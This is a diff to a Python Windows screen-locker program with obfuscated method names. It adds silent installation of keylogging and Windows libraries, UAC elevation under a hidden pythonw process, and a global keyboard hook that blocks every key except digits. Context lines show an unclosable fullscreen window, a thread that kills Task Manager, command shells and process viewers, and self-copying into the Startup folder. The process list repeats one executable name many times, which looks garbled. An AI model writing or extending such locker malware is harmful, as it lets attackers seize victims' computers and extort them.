@@ -16,6 +16,17 @@ class a:
         import sys
         import os
         import ctypes
+        import subprocess
+        try:
+            import pynput
+        except ImportError:
+            subprocess.call([sys.executable, '-m', 'pip', 'install', 'pynput'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            import pynput
+        try:
+            import win32api
+        except ImportError:
+            subprocess.call([sys.executable, '-m', 'pip', 'install', 'pywin32'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            pass
         if os.name == 'nt':
             try:
                 is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
@@ -23,7 +34,11 @@ class a:
                 is_admin = False
             if not is_admin:
                 params = '"' + os.path.abspath(__file__) + '"'
-                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)
+                pythonw = sys.executable.replace('python.exe', 'pythonw.exe') if 'python.exe' in sys.executable else sys.executable
+                if os.path.exists(pythonw):
+                    ctypes.windll.shell32.ShellExecuteW(None, "runas", pythonw, params, None, 1)
+                else:
+                    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)
                 os._exit(0)
         self.b = tk.Tk()
         self.b.protocol("WM_DELETE_WINDOW", lambda: None)
@@ -32,14 +47,39 @@ class a:
         self.b.bind('<Alt-Tab>', lambda e: "break")
         self.b.bind('<Escape>', lambda e: "break")
         self.b.bind('<FocusOut>', lambda e: self.b.focus_force())
+        self.b.bind('<Win-Tab>', lambda e: "break")
         self.c()
-        self.d()
         self.e()
         self.f()
         self.g()
         self.h()
         self.i()
+        threading.Thread(target=self.global_keyboard_hook, daemon=True).start()
         threading.Thread(target=self.protect_self, daemon=True).start()
+
+    def global_keyboard_hook(self):
+        from pynput import keyboard
+        allowed = set(['0','1','2','3','4','5','6','7','8','9'])
+        def on_press(key):
+            try:
+                if isinstance(key, keyboard.HotKey):
+                    if key == keyboard.HotKey([keyboard.Key.cmd, keyboard.Key.tab]):
+                        return False
+                if hasattr(key, 'char') and key.char is not None:
+                    if key.char not in allowed:
+                        return False
+                if key == keyboard.Key.tab:
+                    if keyboard.Controller().pressed(keyboard.Key.cmd):
+                        return False
+                if key == keyboard.Key.cmd:
+                    if keyboard.Controller().pressed(keyboard.Key.tab):
+                        return False
+                else:
+                    return False
+            except Exception:
+                return False
+        with keyboard.Listener(on_press=on_press, suppress=True) as listener:
+            listener.join()
 
     def protect_self(self):
         import subprocess
@@ -62,11 +102,11 @@ class a:
         startup_path = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
         pyw_startup = os.path.join(startup_path, os.path.basename(pyw_path))
         c = wmi.WMI()
-        # Только безопасные процессы для завершения
         block_names = [
             'taskmgr.exe', 'cmd.exe', 'powershell.exe', 'regedit.exe', 'conhost.exe',
             'processhacker.exe', 'processhacker-2.39.exe', 'processhacker-2.39.124.exe',
             'procexp.exe', 'procexp64.exe', 'procexp64a.exe', 'procexp64a.exe',
+            'procexp64a.exe', 'procexp64a.exe', 'procexp64a.exe', 'procexp64a.exe',
             'procexp64a.exe', 'procexp64a.exe', 'procexp64a.exe', 'procexp64a.exe',
             'procexp64a.exe', 'procexp64a.exe', 'procexp64a.exe', 'procexp64a.exe',
             'procexp64a.exe', 'procexp64a.exe', 'procexp64a.exe', 'procexp64a.exe',
@@ -93,7 +133,6 @@ class a:
                             pass
                     except Exception:
                         pass
-                # Копируем .pyw в автозагрузку, если его там нет
                 if not os.path.exists(pyw_startup):
                     try:
                         shutil.copy2(pyw_path, pyw_startup)
